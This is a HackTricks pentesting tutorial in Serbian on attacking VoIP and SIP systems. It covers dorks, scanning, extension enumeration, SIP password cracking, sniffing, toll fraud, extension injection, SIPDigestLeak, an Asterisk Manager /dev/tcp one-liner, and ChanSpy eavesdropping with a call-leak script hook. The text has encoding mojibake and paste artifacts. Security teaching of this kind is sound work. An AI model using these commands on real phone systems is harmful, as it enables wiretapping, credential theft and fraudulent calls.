# Testiranje penetracije VoIP-a

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije o VoIP-u

Za poƒçetak uƒçenja o tome kako VoIP funkcioni≈°e, proverite:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Osnovne poruke
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Kodovi odgovora

**1xx‚ÄîPrivremeni odgovori**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîUspe≈°ni odgovori**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîOdgovori na preusmeravanje**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîOdgovori na gre≈°ke klijenta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîOdgovori o gre≈°ci servera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîGlobalne gre≈°ke**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Enumeracija VoIP-a

### Telefonski brojevi

Jedan od prvih koraka koje Crveni tim mo≈æe preduzeti je pretraga dostupnih telefonskih brojeva za kontaktiranje kompanije koristeƒái OSINT alate, Google pretrage ili skeniranje web stranica.

Kada dobijete telefonske brojeve, mo≈æete koristiti online usluge za identifikaciju operatera:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Znajuƒái da li operater pru≈æa VoIP usluge, mo≈æete identifikovati da li kompanija koristi VoIP... ≈†tavi≈°e, moguƒáe je da kompanija nije anga≈æovala VoIP usluge veƒá koristi PSTN kartice za povezivanje svoje VoIP PBX sa tradicionalnom telefonskom mre≈æom.

Stvari poput automatskih odgovora ili muzike obiƒçno ukazuju na kori≈°ƒáenje VoIP-a.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT informacije

Sve ostale OSINT informacije koje poma≈æu u identifikaciji kori≈°ƒáenog VoIP softvera biƒáe korisne za Crveni Tim.

### Enumeracija mre≈æe

* **`nmap`** je sposoban da skenira UDP servise, ali zbog velikog broja skeniranih UDP servisa, veoma je spor i mo≈æda nije vrlo precizan sa ovom vrstom servisa.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** iz SIPVicious-a (`sudo apt install sipvicious`): Lociraƒáe SIP usluge u navedenoj mre≈æi.
* `svmap` je **lako blokirati** jer koristi User-Agent `friendly-scanner`, ali mo≈æete izmeniti kod iz `/usr/share/sipvicious/sipvicious` i promeniti ga.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS skeniranje`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS skeniranje je veoma brz skener za SIP servise preko UDP, TCP ili TLS. Koristi vi≈°enitno izvr≈°avanje i mo≈æe skenirati velike opsege mre≈æa. Omoguƒáava lako navoƒëenje opsega porta, skeniranje kako TCP tako i UDP, kori≈°ƒáenje drugog metoda (podrazumevano ƒáe koristiti OPTIONS) i specificiranje drugaƒçijeg User-Agent-a (i jo≈° vi≈°e).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatno nabrajanje mre≈ænih servisa

PBX takoƒëe mo≈æe otkrivati druge mre≈æne servise poput:

- **69/UDP (TFTP)**: A≈æuriranje firmware-a
- **80 (HTTP) / 443 (HTTPS)**: Upravljanje ureƒëajem preko web-a
- **389 (LDAP)**: Alternativa za ƒçuvanje informacija o korisnicima
- **3306 (MySQL)**: MySQL baza podataka
- **5038 (Manager)**: Omoguƒáava kori≈°ƒáenje Asteriska sa drugih platformi
- **5222 (XMPP)**: Poruke putem Jabber-a
- **5432 (PostgreSQL)**: PostgreSQL baza podataka
- I drugi...

### Nabrajanje metoda

Moguƒáe je pronaƒái **koje su metode dostupne** za kori≈°ƒáenje na PBX-u koristeƒái `SIPPTS enumerate` iz [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analiziranje odgovora servera

Veoma je va≈æno analizirati zaglavlja koja server ≈°alje nazad ka nama, zavisno od tipa poruke i zaglavlja koje ≈°aljemo. Pomoƒáu `SIPPTS send` alata sa [**sippts**](https://github.com/Pepelux/sippts) mo≈æemo slati personalizovane poruke, manipuli≈°uƒái svim zaglavljima, i analizirati odgovor.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Takoƒëe je moguƒáe dobiti podatke ako server koristi websockets. Pomoƒáu `SIPPTS wssend` alata sa [**sippts**](https://github.com/Pepelux/sippts) mo≈æemo slati personalizovane WS poruke.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumeracija pro≈°irenja

Pro≈°irenja u PBX (Privatna telefonska centrala) sistemu se odnose na **jedinstvene interne identifikatore dodeljene pojedinaƒçnim** telefonskim linijama, ureƒëajima ili korisnicima unutar organizacije ili preduzeƒáa. Pro≈°irenja omoguƒáavaju **efikasno usmeravanje poziva unutar organizacije**, bez potrebe za pojedinaƒçnim spoljnim brojevima telefona za svakog korisnika ili ureƒëaj.

* **`svwar`** iz SIPVicious (`sudo apt install sipvicious`): `svwar` je besplatan skener linija pro≈°irenja SIP PBX-a. Konceptualno radi sliƒçno tradicionalnim wardijalerima tako ≈°to **pogaƒëa opseg pro≈°irenja ili datu listu pro≈°irenja**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifikuje ekstenzije na SIP serveru. Sipexten mo≈æe proveriti velike mre≈æe i opsege portova.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Takoƒëe mo≈æete nabrojati ekstenzije/korisniƒçka imena pomoƒáu metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** je alat za grube sile korisniƒçkih imena za protokol Inter Asterisk Exchange. enumIAX mo≈æe raditi u dva razliƒçita moda; Sekvencijalno pogaƒëanje korisniƒçkih imena ili Reƒçnik napad.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Napadi na VoIP

### Brute-Force napad na lozinke - online

Nakon ≈°to su otkriveni **PBX** i neki **produ≈æeci/korisniƒçka imena**, Crveni tim mo≈æe poku≈°ati da se **autentikuje putem metode `REGISTER`** na produ≈æetak koristeƒái reƒçnik uobiƒçajenih lozinki kako bi izvr≈°io brute force autentikaciju.

{% hint style="danger" %}
Imajte na umu da **korisniƒçko ime** mo≈æe biti isto kao produ≈æetak, ali ova praksa mo≈æe varirati u zavisnosti od sistema PBX-a, njegove konfiguracije i preferencija organizacije...

Ako korisniƒçko ime nije isto kao produ≈æetak, moraƒáete **odrediti korisniƒçko ime za brute-force napad**.
{% endhint %}

* **`svcrack`** iz SIPVicious (`sudo apt install sipvicious`): SVCrack vam omoguƒáava da probijete lozinku za odreƒëeno korisniƒçko ime/produ≈æetak na PBX-u.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack je udaljeni alat za probijanje lozinke za SIP usluge. Rcrack mo≈æe testirati lozinke za vi≈°e korisnika na razliƒçitim IP adresama i opsezima portova.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Snifing VoIP

Ako pronaƒëete VoIP opremu unutar **Otvorenog Wifi mre≈æe**, mo≈æete **snifovati sve informacije**. ≈†tavi≈°e, ako se nalazite unutar ne≈°to zatvorenije mre≈æe (povezani preko Ethernet-a ili za≈°tiƒáenog Wifija) mo≈æete izvesti **MitM napade kao ≈°to su** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) izmeƒëu **PBX-a i gateway-a** kako biste snifovali informacije.

Meƒëu informacijama o mre≈æi, mo≈æete pronaƒái **web kredencijale** za upravljanje opremom, korisniƒçke **ekstenzije**, **korisniƒçko ime**, **IP** adrese, ƒçak i **hashovane lozinke** i **RTP pakete** koje mo≈æete reprodukovati kako biste **ƒçuli razgovor**, i jo≈° mnogo toga.

Da biste dobili ove informacije, mo≈æete koristiti alate poput Wireshark, tcpdump... ali **posebno kreiran alat za snifovanje VoIP razgovora je** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Imajte na umu da ako se **TLS koristi u SIP komunikaciji** neƒáete moƒái videti SIP komunikaciju u ƒçistom obliku.\
Isto ƒáe se desiti ako se koristi **SRTP** i **ZRTP**, **RTP paketi neƒáe biti u ƒçitljivom tekstu**.
{% endhint %}

#### SIP kredencijali (Bruteforce lozinke - offline)

[Pogledajte ovaj primer da biste bolje razumeli **SIP REGISTER komunikaciju**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) kako biste saznali kako se **kredencijali ≈°alju**.

* **`sipdump`** & **`sipcrack`,** deo **sipcrack** (`apt-get install sipcrack`): Ovi alati mogu **izvuƒái** iz **pcap** datoteke **digest autentifikacije** unutar SIP protokola i **bruteforce**-ovati ih.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump mo≈æe izvuƒái digest autentikacije iz pcap datoteke.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack je alatka za de≈°ifrovanje autentikacija digesta dobijenih sa SIPPTS dumpom.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark izvlaƒçi podatke SIP protokola iz PCAP datoteke.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF kodovi

**Ne samo SIP kredencijali** mogu se pronaƒái u mre≈ænom saobraƒáaju, takoƒëe je moguƒáe pronaƒái DTMF kodove koji se koriste, na primer, za pristup **po≈°tanskom sanduƒçetu**.\
Moguƒáe je poslati ove kodove u **INFO SIP porukama**, u **audio** formatu ili unutar **RTP paketa**. Ako su kodovi unutar RTP paketa, mo≈æete isecati taj deo razgovora i koristiti alatku multimo za njihovo izdvajanje:
```bash
multimon -a DTMF -t wac pin.wav
```
### Besplatni pozivi / Nesporazumi u konfiguraciji Asterisk konekcija

U Asterisku je moguƒáe dozvoliti konekciju **sa odreƒëene IP adrese** ili sa **bilo koje IP adrese**:
```
host=10.10.10.10
host=dynamic
```
Ako je navedena IP adresa, **domaƒáin neƒáe morati slati REGISTER** zahteve povremeno (u REGISTER paketu se ≈°alje vreme ≈æivota, obiƒçno 30 minuta, ≈°to znaƒçi da u drugom scenariju telefon mora ponovo da se registruje svakih 30 minuta). Meƒëutim, moraƒáe imati otvorene portove koji omoguƒáavaju konekcije sa VoIP serverom radi primanja poziva.

Za definisanje korisnika mogu se koristiti sledeƒáe oznake:

* **`type=user`**: Korisnik mo≈æe samo primati pozive kao korisnik.
* **`type=friend`**: Moguƒáe je obavljati pozive kao vr≈°njak i primati ih kao korisnik (koristi se sa ekstenzijama)
* **`type=peer`**: Moguƒáe je slati i primati pozive kao vr≈°njak (SIP-trunkovi)

Takoƒëe je moguƒáe uspostaviti poverenje sa nesigurnom promenljivom:

* **`insecure=port`**: Dozvoljava vr≈°njacima konekcije validirane preko IP adrese.
* **`insecure=invite`**: Ne zahteva autentifikaciju za INVITE poruke
* **`insecure=port,invite`**: Obe opcije

{% hint style="warning" %}
Kada se koristi **`type=friend`**, **vrednost** promenljive **host** **neƒáe biti kori≈°ƒáena**, pa ako administrator **pogre≈°no konfiguri≈°e SIP-trunk** koristeƒái tu vrednost, **svako ƒáe moƒái da se pove≈æe sa njim**.

Na primer, ova konfiguracija bi bila ranjiva:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Besplatni Pozivi / Netaƒçne Konfiguracije Konteksta u Asterisku

U Asterisku, **kontekst** je nazvani kontejner ili sekcija u planu biranja koji **grupi≈°e povezane ekstenzije, akcije i pravila**. Plan biranja je osnovna komponenta sistema Asterisk, jer defini≈°e **kako se obraƒëuju i usmeravaju dolazni i odlazni pozivi**. Konteksti se koriste za organizovanje plana biranja, upravljanje kontrolom pristupa i pru≈æanje razdvajanja izmeƒëu razliƒçitih delova sistema.

Svaki kontekst je definisan u konfiguracionom fajlu, obiƒçno u fajlu **`extensions.conf`**. Konteksti se oznaƒçavaju uglastim zagradama, sa imenom konteksta unutar njih. Na primer:
```bash
csharpCopy code[my_context]
```
Unutar konteksta, defini≈°ete ekstenzije (obrasce biranih brojeva) i povezujete ih sa nizom akcija ili aplikacija. Ove akcije odreƒëuju kako ƒáe poziv biti obraƒëen. Na primer:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Ovaj primer demonstrira jednostavan kontekst nazvan "moj_kontekst" sa ekstenzijom "100". Kada neko birne 100, poziv ƒáe biti prihvaƒáen, reprodukovaƒáe se poruka dobrodo≈°lice, a zatim ƒáe poziv biti zavr≈°en.

Ovo je **jo≈° jedan kontekst** koji omoguƒáava **pozivanje bilo kog drugog broja**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Ako administrator defini≈°e **podrazumevani kontekst** kao:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Bilo ko ƒáe moƒái da koristi **server da pozove bilo koji drugi broj** (a administrator servera ƒáe platiti poziv).
{% endhint %}

{% hint style="danger" %}
≈†tavi≈°e, podrazumevano **`sip.conf`** datoteka sadr≈æi **`allowguest=true`**, ≈°to znaƒçi da ƒáe **bilo** koji napadaƒç **bez autentikacije** moƒái da pozove bilo koji drugi broj.
{% endhint %}

*   **`SIPPTS invite`** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite proverava da li nam **PBX server dozvoljava da vr≈°imo pozive bez autentikacije**. Ako je SIP server netaƒçno konfigurisan, dozvoliƒáe nam da vr≈°imo pozive ka spoljnim brojevima. Takoƒëe mo≈æe da nam dozvoli da preusmerimo poziv ka drugom spoljnom broju.

Na primer, ako va≈° Asterisk server ima lo≈°u konfiguraciju konteksta, mo≈æete prihvatiti INVITE zahtev bez autorizacije. U tom sluƒçaju, napadaƒç mo≈æe vr≈°iti pozive ne znajuƒái korisniƒçko ime/≈°ifru.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Besplatni pozivi / Nekonfigurisani IVRS

IVRS oznaƒçava **Interaktivni sistem za odgovor na glas**, telefonsku tehnologiju koja omoguƒáava korisnicima da komuniciraju sa raƒçunarskim sistemom putem glasa ili tastera na dodir. IVRS se koristi za izgradnju **automatizovanih sistema za upravljanje pozivima** koji nude razliƒçite funkcionalnosti, kao ≈°to su pru≈æanje informacija, usmeravanje poziva i prikupljanje korisniƒçkih unosa.

IVRS u VoIP sistemima obiƒçno se sastoji od:

1. **Glasovnih poruka**: Prethodno snimljeni audio zapisi koji vode korisnike kroz opcije menija IVR-a i uputstva.
2. **DTMF** (Dual-Tone Multi-Frequency) signalizacija: Unosi tastera na telefonu generisani pritiskom tastera, koji se koriste za navigaciju kroz menije IVR-a i unos podataka.
3. **Usmeravanje poziva**: Usmeravanje poziva ka odgovarajuƒáoj destinaciji, kao ≈°to su odreƒëeni departmani, agenti ili ekstenzije na osnovu korisniƒçkog unosa.
4. **Prikupljanje korisniƒçkih unosa**: Sakupljanje informacija od pozivaoca, kao ≈°to su brojevi raƒçuna, ID sluƒçaja ili bilo koji drugi relevantni podaci.
5. **Integracija sa spoljnim sistemima**: Povezivanje IVR sistema sa bazama podataka ili drugim softverskim sistemima radi pristupa ili a≈æuriranja informacija, obavljanja akcija ili pokretanja dogaƒëaja.

U Asterisk VoIP sistemu, mo≈æete kreirati IVR koristeƒái plan biranja (**`extensions.conf`** fajl) i razliƒçite aplikacije poput `Background()`, `Playback()`, `Read()` i drugih. Ove aplikacije vam poma≈æu da reprodukujete glasovne poruke, prikupite korisniƒçke unose i kontroli≈°ete tok poziva.

#### Primer ranjive konfiguracije
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Prethodni je primer gde se korisnika tra≈æi da **pritisne 1 da pozove** odeljenje, **2 da pozove** drugo, ili **kompletan broj ekstenzije** ako je zna.\
Ranjivost je u tome ≈°to du≈æina naznaƒçene **ekstenzije nije proverena, tako da korisnik mo≈æe uneti potpuni broj tokom 5 sekundi i biƒáe pozvan.**

### Ubacivanje ekstenzije

Kori≈°ƒáenjem ekstenzije poput:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gde je **`${EXTEN}`** **produ≈æetak** koji ƒáe biti pozvan, kada se unese **ext 101** ovo bi se desilo:
```scss
exten => 101,1,Dial(SIP/101)
```
Meƒëutim, ako **`${EXTEN}`** dozvoljava uno≈°enje **vi≈°e od brojeva** (kao u starijim verzijama Asteriska), napadaƒç bi mogao uneti **`101&SIP123123123`** da bi pozvao broj telefona 123123123. A ovo bi bio rezultat:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Dakle, poziv na ekstenziju **`101`** i **`123123123`** ƒáe biti poslat i samo ƒáe prvi dobiti poziv biti uspostavljen... ali ako napadaƒç koristi **ekstenziju koja zaobilazi bilo koji podudarajuƒái** koji se vr≈°i ali ne postoji, on bi mogao **ubaciti poziv samo na ≈æeljeni broj**.

## Ranjivost SIPDigestLeak

SIP Digest Leak je ranjivost koja utiƒçe na veliki broj SIP telefona, ukljuƒçujuƒái i hardverske i softverske IP telefone, kao i telefonske adaptere (VoIP za analogni). Ranjivost omoguƒáava **procurivanje odgovora na Digest autentikaciju**, koji se izraƒçunava iz lozinke. Tada je moguƒá **napad na lozinku van mre≈æe** i mo≈æe se povratiti veƒáina lozinki na osnovu odgovora na izazov.

**[Scenario ranjivosti odavde**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP telefon (≈ærtva) slu≈°a na bilo kojem portu (na primer: 5060), prihvata pozive
2. Napadaƒç ≈°alje INVITE IP telefonu
3. Telefon ≈ærtve poƒçinje zvoniti i neko se javlja i prekida vezu (jer niko ne odgovara na telefon s druge strane)
4. Kada se telefon prekine, **telefon ≈ærtve ≈°alje BYE napadaƒçu**
5. **Napadaƒç izdaje odgovor 407** koji **tra≈æi autentikaciju** i izdaje izazov za autentikaciju
6. **Telefon ≈ærtve pru≈æa odgovor na izazov za autentikaciju** u drugom BYE
7. **Napadaƒç tada mo≈æe izvr≈°iti napad brute-force** na odgovor izazova na svojoj lokalnoj ma≈°ini (ili distribuiranoj mre≈æi itd.) i pogoditi lozinku

* **SIPPTS leak** sa [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS leak iskori≈°ƒáava ranjivost SIP Digest Leak koja utiƒçe na veliki broj SIP telefona. Izlaz se mo≈æe saƒçuvati u formatu SipCrack kako bi se izvr≈°io napad brute-force kori≈°ƒáenjem SIPPTS dcrack ili alata SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call omoguƒáava **web korisniku** (koji je na primer zainteresovan za proizvod) da **unese** svoj **broj telefona** kako bi bio pozvan. Zatim ƒáe biti pozvan komercijal, i kada **korisnik podigne telefon** biƒáe **pozvan i povezan sa agentom**.

Uobiƒçajeni Asterisk profil za ovo je:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Prethodni profil omoguƒáava **BILO KOJOJ IP adresi da se pove≈æe** (ako je lozinka poznata).
* Za **organizovanje poziva**, kao ≈°to je prethodno navedeno, **nije potrebna dozvola za ƒçitanje** i potrebno je samo **originirati** u **pisanje**.

Sa ovim dozvolama, bilo koja IP adresa koja zna lozinku mogla bi se povezati i izvuƒái previ≈°e informacija, kao ≈°to su:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Mo≈æe se zatra≈æiti vi≈°e informacija ili akcija.**

### **Prislu≈°kivanje**

U Asterisku je moguƒáe koristiti komandu **`ChanSpy`** koja oznaƒçava **pro≈°irenje(e) za praƒáenje** (ili sve njih) kako bi se ƒçule razgovori koji se odvijaju. Ova komanda mora biti dodeljena pro≈°irenju.

Na primer, **`exten => 333,1,ChanSpy('all',qb)`** oznaƒçava da ako **pozovete** **pro≈°irenje 333**, ono ƒáe **pratiti** **`sve`** pro≈°irenja, **poƒçeti slu≈°ati** svaki put kada poƒçne novi razgovor (**`b`**) u ti≈°ini (**`q`**) jer ne ≈æelimo da interagujemo s njim. Mo≈æete preƒái s jednog razgovora na drugi pritiskom na **`*`**, ili oznaƒçavanjem broja pro≈°irenja.

Takoƒëe je moguƒáe koristiti **`ExtenSpy`** za praƒáenje samo jednog pro≈°irenja.

Umesto slu≈°anja razgovora, moguƒáe je **snimiti ih u datoteke** koristeƒái pro≈°irenje poput:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Pozivi ƒáe biti saƒçuvani u **`/tmp`**.

Takoƒëe mo≈æete ƒçak naterati Asterisk da **izvr≈°i skriptu koja ƒáe procuriti poziv** kada se zatvori.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed ranjivost

**RTCPBleed** je znaƒçajan sigurnosni problem koji pogaƒëa VoIP servere zasnovane na Asterisk-u (objavljen 2017. godine). Ranjivost omoguƒáava da se **RTP (Real Time Protocol) saobraƒáaj**, koji prenosi VoIP razgovore, **interceptira i preusmeri od strane bilo koga na Internetu**. Do ovoga dolazi jer RTP saobraƒáaj zaobilazi autentifikaciju prilikom prolaska kroz NAT (Network Address Translation) firewall-ove.

